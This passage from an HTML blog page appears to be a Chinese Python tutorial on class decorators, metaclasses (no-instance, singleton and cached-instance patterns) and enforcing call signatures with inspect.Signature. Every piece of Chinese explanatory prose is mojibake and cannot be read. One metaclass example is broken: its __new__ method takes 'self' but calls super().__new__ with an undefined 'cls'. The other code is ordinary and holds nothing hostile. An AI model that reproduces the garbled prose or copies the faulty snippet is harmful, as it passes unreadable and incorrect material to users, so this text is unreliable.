class="keyword">def</span> <span class="title">c</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>è¿™ç§å®ç°æ–¹æ¡ˆä¹‹æ‰€ä»¥è¡Œå¾—é€šï¼Œåœ¨äºå¼ºåˆ¶å…³é”®å­—å‚æ•°å¾ˆå®¹æ˜“è¢«æ·»åŠ åˆ°æ¥å—<code>*args</code>å’Œ<code>**kwargs</code>å‚æ•°çš„å‡½æ•°ä¸­ã€‚é€šè¿‡ä½¿ç”¨å¼ºåˆ¶å…³é”®å­—å‚æ•°ï¼Œå®ƒè¢«ä½œä¸ºä¸€ä¸ªç‰¹æ®Šæƒ…å†µè¢«æŒ‘é€‰å‡ºæ¥ï¼Œå¹¶ä¸”æ¥ä¸‹æ¥ä»…ä»…ä½¿ç”¨å‰©ä½™çš„ä½ç½®å’Œå…³é”®å­—å‚æ•°å»è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œè¿™ä¸ªç‰¹æ®Šå‚æ•°ä¼šè¢«æ’é™¤åœ¨å¤–ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¹¶ä¸ä¼šè¢«çº³å…¥åˆ°<code>**kwargs</code>ä¸­å»ã€‚</p><p>è¿˜æœ‰ä¸€ä¸ªéš¾ç‚¹å°±æ˜¯å¦‚ä½•å»å¤„ç†è¢«æ·»åŠ çš„å‚æ•°ä¸è¢«åŒ…è£…å‡½æ•°å‚æ•°ç›´æ¥çš„åå­—å†²çªã€‚ä¾‹å¦‚ï¼Œå¦‚æœè£…é¥°å™¨<code>@optional_debug</code>ä½œç”¨åœ¨ä¸€ä¸ªå·²ç»æ‹¥æœ‰ä¸€ä¸ª<code>debug</code>å‚æ•°çš„å‡½æ•°ä¸Šæ—¶ä¼šæœ‰é—®é¢˜ã€‚è¿™é‡Œå¢åŠ äº†ä¸€æ­¥åå­—æ£€æŸ¥ã€‚</p><h4 id="ä½¿ç”¨è£…é¥°å™¨æ‰©å……ç±»çš„åŠŸèƒ½"><a href="#ä½¿ç”¨è£…é¥°å™¨æ‰©å……ç±»çš„åŠŸèƒ½" class="headerlink" title="ä½¿ç”¨è£…é¥°å™¨æ‰©å……ç±»çš„åŠŸèƒ½"></a>ä½¿ç”¨è£…é¥°å™¨æ‰©å……ç±»çš„åŠŸèƒ½</h4><p>å¦‚æœæƒ³é€šè¿‡åçœæˆ–è€…é‡å†™ç±»å®šä¹‰çš„æŸéƒ¨åˆ†æ¥ä¿®æ”¹å®ƒçš„è¡Œä¸ºï¼Œä½†æ˜¯åˆä¸å¸Œæœ›ä½¿ç”¨ç»§æ‰¿æˆ–å…ƒç±»çš„æ–¹å¼ã€‚å¯ä»¥ä½¿ç”¨ç±»è£…é¥°å™¨ï¼Œä¾‹å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªé‡å†™äº†ç‰¹æ®Šæ–¹æ³•<code>__getattribute__</code>çš„ç±»è£…é¥°å™¨ï¼Œå¯ä»¥æ‰“å°æ—¥å¿—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_getattribute</span><span class="params">(cls)</span>:</span></span><br><span class="line">    orig_getattribute = cls.__getattribute__</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">new_getattribute</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        print(<span class="string">'getting:'</span>, name)</span><br><span class="line">        <span class="keyword">return</span> orig_getattribute(self, name)</span><br><span class="line"></span><br><span class="line">    cls.__getattribute__ = new_getattribute</span><br><span class="line">    <span class="keyword">return</span> cls</span><br><span class="line"></span><br><span class="line"><span class="meta">@log_getattribute</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,x)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = A(<span class="number">42</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.x</span><br><span class="line">getting: x</span><br><span class="line"><span class="number">42</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.spam()</span><br><span class="line">getting: spam</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="ä½¿ç”¨å…ƒç±»æ§åˆ¶å®ä¾‹çš„åˆ›å»º"><a href="#ä½¿ç”¨å…ƒç±»æ§åˆ¶å®ä¾‹çš„åˆ›å»º" class="headerlink" title="ä½¿ç”¨å…ƒç±»æ§åˆ¶å®ä¾‹çš„åˆ›å»º"></a>ä½¿ç”¨å…ƒç±»æ§åˆ¶å®ä¾‹çš„åˆ›å»º</h4><p>å¦‚æœå®šä¹‰äº†ä¸€ä¸ªç±»ï¼Œå°±èƒ½åƒå¯’æš‘æ˜“ç”¨çš„è°ƒç”¨å®ƒæ¥åˆ›å»ºå®ä¾‹ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">a = Spam(<span class="string">'warry'</span>)</span><br><span class="line">b = Spam(<span class="string">'elssm'</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³è‡ªå®šä¹‰è¿™ä¸ªæ­¥éª¤ï¼Œå¯ä»¥å®šä¹‰ä¸€ä¸ªå…ƒç±»å¹¶è‡ªå·±å®ç°<code>__call__()</code>æ–¹æ³•ï¼Œå¦‚æœä¸å¸Œæœ›ä»»ä½•äººåˆ›å»ºè¿™ä¸ªç±»çš„å®ä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NoInstances</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">"Can't instantiate directly"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(metaclass=NoInstances)</span>:</span></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">grok</span><span class="params">(x)</span>:</span></span><br><span class="line">        print(<span class="string">'Spam.grok'</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œç”¨æˆ·åªèƒ½è°ƒç”¨è¿™ä¸ªç±»çš„é™æ€æ–¹æ³•ï¼Œè€Œä¸èƒ½ä½¿ç”¨é€šå¸¸çš„æ–¹æ³•æ¥åˆ›å»ºå®ƒçš„å®ä¾‹ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>Spam.grok(<span class="number">42</span>)</span><br><span class="line">Spam.grok</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = Spam()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    File <span class="string">"example1.py"</span>, line <span class="number">7</span>, <span class="keyword">in</span> __call__</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">"Can't instantiate directly"</span>)</span><br><span class="line">TypeError: Can<span class="string">'t instantiate directly</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>å®ç°å•ä¾‹æ¨¡å¼ï¼ˆåªèƒ½åˆ›å»ºå”¯ä¸€å®ä¾‹çš„ç±»ï¼‰çš„ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        self.__instance = <span class="literal">None</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.__instance <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.__instance = super().__call__(*args, **kwargs)</span><br><span class="line">            <span class="keyword">return</span> self.__instance</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.__instance</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(metaclass=Singleton)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Creating Spam'</span>)</span><br></pre></td></tr></table></figure><p>è¿™æ ·<code>Spam</code>ç±»å°±åªèƒ½åˆ›å»ºå”¯ä¸€çš„å®ä¾‹äº†ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Spam()</span><br><span class="line">Creating Spam</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Spam()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> c</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¦‚æœæƒ³åˆ›å»ºç¼“å­˜å®ä¾‹ï¼Œå¯ä»¥é€šè¿‡å…ƒç±»æ¥å®ç°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> weakref</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cached</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line">        self.__cache = weakref.WeakValueDictionary()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, *args)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> args <span class="keyword">in</span> self.__cache:</span><br><span class="line">            <span class="keyword">return</span> self.__cache[args]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            obj = super().__call__(*args)</span><br><span class="line">            self.__cache[args] = obj</span><br><span class="line">            <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span><span class="params">(metaclass=Cached)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        print(<span class="string">'Creating Spam(&#123;!r&#125;)'</span>.format(name))</span><br><span class="line">        self.name = name</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Spam(<span class="string">'Guido'</span>)</span><br><span class="line">Creating Spam(<span class="string">'Guido'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = Spam(<span class="string">'Diana'</span>)</span><br><span class="line">Creating Spam(<span class="string">'Diana'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = Spam(<span class="string">'Guido'</span>) <span class="comment"># ç¼“å­˜</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b</span><br><span class="line"><span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> c <span class="comment"># è¿”å›çš„æ˜¯ç¼“å­˜çš„å€¼</span></span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="argså’Œ-kwargsçš„å¼ºåˆ¶å‚æ•°ç­¾å"><a href="#argså’Œ-kwargsçš„å¼ºåˆ¶å‚æ•°ç­¾å" class="headerlink" title="argså’Œ*kwargsçš„å¼ºåˆ¶å‚æ•°ç­¾å"></a><em>argså’Œ*</em>kwargsçš„å¼ºåˆ¶å‚æ•°ç­¾å</h4><p>å¯¹ä»»ä½•æ¶‰åŠåˆ°æ“ä½œå‡½æ•°è°ƒç”¨ç­¾åçš„é—®é¢˜ï¼Œéƒ½åº”è¯¥ä½¿ç”¨<code>inspect</code>æ¨¡å—ä¸­çš„ç­¾åç‰¹æ€§ã€‚æˆ‘ä»¬æœ€ä¸»è¦å…³æ³¨ä¸¤ä¸ªç±»ï¼š<code>Signature</code>å’Œ<code>Parameter</code>ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåˆ›å»ºå‡½æ•°å‰é¢çš„äº¤äº’ä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> inspect <span class="keyword">import</span> Signature, Parameter</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Make a signature for a func(x, y=42, *, z=None)</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parms = [ Parameter(<span class="string">'x'</span>, Parameter.POSITIONAL_OR_KEYWORD),</span><br><span class="line"><span class="meta">... </span>        Parameter(<span class="string">'y'</span>, Parameter.POSITIONAL_OR_KEYWORD, default=<span class="number">42</span>),</span><br><span class="line"><span class="meta">... </span>        Parameter(<span class="string">'z'</span>, Parameter.KEYWORD_ONLY, default=<span class="literal">None</span>) ]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sig = Signature(parms)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(sig)</span><br><span class="line">(x, y=<span class="number">42</span>, *, z=<span class="literal">None</span>)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦æœ‰äº†ä¸€ä¸ªç­¾åå¯¹è±¡ï¼Œä½ å°±å¯ä»¥ä½¿ç”¨å®ƒçš„<code>bind()</code>æ–¹æ³•å¾ˆå®¹æ˜“çš„å°†å®ƒç»‘å®šåˆ°<code>*args</code>å’Œ<code>**kwargs</code>ä¸Šå»ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„æ¼”ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(*args, **kwargs)</span>:</span></span><br><span class="line"><span class="meta">... </span>    bound_values = sig.bind(*args, **kwargs)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">for</span> name, value <span class="keyword">in</span> bound_values.arguments.items():</span><br><span class="line"><span class="meta">... </span>        print(name,value)</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="comment"># Try various examples</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, <span class="number">2</span>, z=<span class="number">3</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line">y <span class="number">2</span></span><br><span class="line">z <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, z=<span class="number">3</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line">z <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(y=<span class="number">2</span>, x=<span class="number">1</span>)</span><br><span class="line">x <span class="number">1</span></span><br><span class="line">y <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">    File <span class="string">"/usr/local/lib/python3.3/inspect.py"</span>, line <span class="number">1972</span>, <span class="keyword">in</span> _bind</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'too many positional arguments'</span>)</span><br><span class="line">TypeError: too many positional arguments</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(y=<span class="number">2</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">    File <span class="string">"/usr/local/lib/python3.3/inspect.py"</span>, line <span class="number">1961</span>, <span class="keyword">in</span> _bind</span><br><span class="line">        <span class="keyword">raise</span> TypeError(msg) <span class="keyword">from</span> <span class="literal">None</span></span><br><span class="line">TypeError: <span class="string">'x'</span> parameter lacking default value</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>func(<span class="number">1</span>, y=<span class="number">2</span>, x=<span class="number">3</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">    File <span class="string">"/usr/local/lib/python3.3/inspect.py"</span>, line <span class="number">1985</span>, <span class="keyword">in</span> _bind</span><br><span class="line">        <span class="string">'&#123;arg!r&#125;'</span>.format(arg=param.name))</span><br><span class="line">TypeError: multiple values <span class="keyword">for</span> argument <span class="string">'x'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹å‡ºæ¥ï¼Œé€šè¿‡å°†ç­¾åå’Œä¼ é€’çš„å‚æ•°ç»‘å®šèµ·æ¥ï¼Œå¯ä»¥å¼ºåˆ¶å‡½æ•°è°ƒç”¨éµå¾ªç‰¹å®šçš„è§„åˆ™ï¼Œæ¯”å¦‚å¿…å¡«ã€é»˜è®¤ã€é‡å¤ç­‰ç­‰ã€‚<br>ä¸‹é¢æ˜¯ä¸€ä¸ªå¼ºåˆ¶å‡½æ•°ç­¾åæ›´å…·ä½“çš„ä¾‹å­ã€‚åœ¨ä»£ç ä¸­ï¼Œæˆ‘ä»¬åœ¨åŸºç±»ä¸­å…ˆå®šä¹‰äº†ä¸€ä¸ªéå¸¸é€šç”¨çš„<code>__init__()</code>æ–¹æ³•ï¼Œç„¶åå¼ºåˆ¶æ‰€æœ‰çš„å­ç±»å¿…é¡»æä¾›ä¸€ä¸ªç‰¹å®šçš„å‚æ•°ç­¾åã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> inspect <span class="keyword">import</span> Signature, Parameter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_sig</span><span class="params">(*names)</span>:</span></span><br><span class="line">    parms = [Parameter(name, Parameter.POSITIONAL_OR_KEYWORD)</span><br><span class="line">            <span class="keyword">for</span> name <span class="keyword">in</span> names]</span><br><span class="line">    <span class="keyword">return</span> Signature(parms)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Structure</span>:</span></span><br><span class="line">    __signature__ = make_sig()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        bound_values = self.__signature__.bind(*args, **kwargs)</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> bound_values.arguments.items():</span><br><span class="line">            setattr(self, name, value)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Example use</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(Structure)</span>:</span></span><br><span class="line">    __signature__ = make_sig(<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span><span class="params">(Structure)</span>:</span></span><br><span class="line">    __signature__ = make_sig(<span class="string">'x'</span>, <span class="string">'y'</span>)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ˜¯ä½¿ç”¨è¿™ä¸ª<code>Stock</code>ç±»çš„ç¤ºä¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> inspect</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(inspect.signature(Stock))</span><br><span class="line">(name, shares, price)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s1 = Stock(<span class="string">'ACME'</span>, <span class="number">100</span>, <span class="number">490.1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s2 = Stock(<span class="string">'ACME'</span>, <span class="number">100</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">TypeError: <span class="string">'price'</span> parameter lacking default value</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>s3 = Stock(<span class="string">'ACME'</span>, <span class="number">100</span>, <span class="number">490.1</span>, shares=<span class="number">50</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">TypeError: multiple values <span class="keyword">for</span> argument <span class="string">'shares'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="åœ¨ç±»ä¸Šå¼ºåˆ¶ä½¿ç”¨ç¼–ç¨‹è§„çº¦"><a href="#åœ¨ç±»ä¸Šå¼ºåˆ¶ä½¿ç”¨ç¼–ç¨‹è§„çº¦" class="headerlink" title="åœ¨ç±»ä¸Šå¼ºåˆ¶ä½¿ç”¨ç¼–ç¨‹è§„çº¦"></a>åœ¨ç±»ä¸Šå¼ºåˆ¶ä½¿ç”¨ç¼–ç¨‹è§„çº¦</h4><p>å¦‚æœæƒ³ç›‘æ§ç±»çš„å®šä¹‰ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡å®šä¹‰ä¸€ä¸ªå…ƒç±»ã€‚ä¸€ä¸ªåŸºæœ¬å…ƒç±»é€šå¸¸æ˜¯ç»§æ‰¿è‡ª<code>type</code>å¹¶é‡å®šä¹‰å®ƒçš„<code>__new__()</code>æ–¹æ³• æˆ–è€…æ˜¯<code>__init__()</code>æ–¹æ³•ã€‚æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMeta</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(self, clsname, bases, clsdict)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> super().__new__(cls, clsname, bases, clsdict)</span><br></pre></td></tr></table></figure><p>å¦ä¸€ç§æ˜¯ï¼Œå®šä¹‰<code>__init__()</code>æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyMeta</span><span class="params">(type)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, clsname, bases, clsdict)</span>:</span></span><br><span class="line">        super().__init__(clsname, bases, clsdict)</span><br></pre></td></tr></table></figure><p>ä¸ºäº†ä½¿ç”¨è¿™ä¸ªå…ƒç±»ï¼Œé€šå¸¸è¦å°†å®ƒæ”¾åˆ°åˆ°ä¸€ä¸ªé¡¶çº§çˆ¶ç±»å®šä¹‰ä¸­ï¼Œç„¶åå…¶ä»–çš„ç±»ç»§æ‰¿è¿™ä¸ªé¡¶çº§çˆ¶ç±»ã€‚ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Root</span><span class="params">(metaclass=MyMeta)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(Root)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(Root)</span>:</span></span><br><span class="line">    <span 